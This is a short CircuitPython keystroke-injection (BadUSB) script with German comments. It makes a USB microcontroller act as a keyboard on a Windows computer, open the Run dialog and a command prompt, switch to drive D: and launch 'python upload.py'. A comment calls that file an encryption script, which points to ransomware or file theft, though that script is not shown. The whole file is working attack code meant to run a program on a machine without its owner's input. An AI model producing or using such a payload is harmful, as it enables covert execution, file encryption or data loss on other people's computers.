import time
import board
import digitalio
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_de import KeyboardLayout
from keycode_win_de import Keycode

# Initialisiere die Tastatur und das Layout
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

# Warte, bis der Computer bereit ist
time.sleep(3)

# Öffne den Ausführen-Dialog (Windows)
kbd.press(Keycode.GUI)
kbd.press(Keycode.R)
kbd.release_all()
time.sleep(1.5)

# Öffne eine Kommandozeile
layout.write('cmd')
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(2)

# Navigiere zum USB-Laufwerk und führe das Verschlüsselungsskript aus
layout.write('D:')
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(0.5)
layout.write('python upload.py')
kbd.press(Keycode.ENTER)
kbd.release_all()
